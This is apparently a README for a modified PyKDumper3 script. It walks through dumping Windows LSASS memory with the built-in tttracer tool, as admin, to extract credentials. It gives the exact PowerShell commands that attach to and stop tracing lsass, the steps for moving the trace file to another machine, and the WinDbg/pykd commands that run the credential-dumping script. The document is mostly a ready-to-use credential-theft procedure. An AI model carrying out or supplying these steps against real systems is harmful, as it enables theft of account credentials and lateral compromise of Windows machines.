# PyKDumper3_tttracer
PyKDumper3 modified for TTTracer credentials dumpping

## Background
Found this twitter post: https://twitter.com/n_o_t_h_a_n_k_s/status/1559620227586875392

It is an interesting built-in method to dump lsass memory.

## Tools
- Windows machine

- Windbg Preview Without Microsoft Store:
  1. Paste the Microsoft Store windbg link into https://store.rg-adguard.net/ to receive a download link
  2. Wget the appx file `wget -O windbg.appx https://link`
  3. Double click to install it

Ref: https://digitalitskills.com/windbg-preview-download-and-install-without-ms-store/

- pykd
https://githomelab.ru/pykd/pykd-ext/-/wikis/Downloads

- PyKDumper3.py
https://github.com/uf0o/PykDumper/blob/master/PyKDumper/PyKDumper3.py

## Analysis

### 1. Create dump file (as admin privilege)
```
Powershell session 1: 
tttracer -dumpfull -attach (Get-Process lsass | Select -expand id)
```

Wait 3-6s please...

```
Powershell session 2: 
tttracer -stop (Get-Process lsass | Select -expand id)
```

### 2. Copy the .run file to your machine with windbg

### 3. Prepare pykd
Download pykd and copy pykd.dll to `%LocalAppData%\Dbg\EngineExtensions`

### 4. Prepare PyKDumper3_tttracer.py

### 5. Read lsass dump
windbg load .run file

windbg cmd:
```
.load pykd
!py path_to_script\PyKDumper3_tttracer.py
```
